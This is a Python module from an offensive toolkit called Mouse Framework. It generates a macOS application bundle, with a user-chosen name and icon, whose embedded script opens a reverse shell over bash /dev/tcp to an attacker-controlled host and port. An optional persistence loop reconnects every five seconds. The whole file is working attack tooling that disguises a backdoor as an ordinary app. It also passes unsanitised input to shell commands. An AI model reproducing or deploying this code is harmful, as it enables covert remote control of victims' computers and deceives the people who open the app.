#!/usr/bin/env python

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

from core import helper as h
import os, time

class payload:
	def __init__(self):
		self.name = "App macOS payload"
		self.description = "Convert payload into the macOS Application."
		self.usage = "Run this application."

	def run(self,server):
		while 1:
			shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
                        name = raw_input(h.info_general_raw("Application Name: ")).strip(" ")
                        icon = raw_input(h.info_general_raw("Application Icon: ")).strip(" ")
			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).strip(" ").lower()
			if persistence == "y":
				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
				break
			elif persistence == "n" or not persistence:
				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
				break
			else:
				h.info_error("Unrecognized option!")

		if os.path.exists("payloads") == False:
			os.mkdir("payloads")
		if os.path.exists("payloads/macos_application") == False:
			os.mkdir("payloads/macos_application")
			os.system("""
cp -r data/app/payload.app payloads/macos_application
mv payloads/macos_application/payload.app payloads/macos_application/"""+name+""".app
mv """+icon+""" payloads/macos_application/"""+name+""".app/Contents/Resources/payload.icns
                        """)
		payload_save_path = "payloads/macos_application/"+name+".app/Contents/MacOS/payload.sh"
                sas = "payloads/macos_application/"+name+".app"
		payload = """\
#! /usr/bin/env bash
"""+shell_command+"""
                """
		f = open(payload_save_path,"w")
		f.write(payload)
		f.close()
		h.info_general("Payload saved to " + sas)
		os.system("chmod +x payloads/macos_application/"+name+".app/Contents/MacOS/payload.sh")

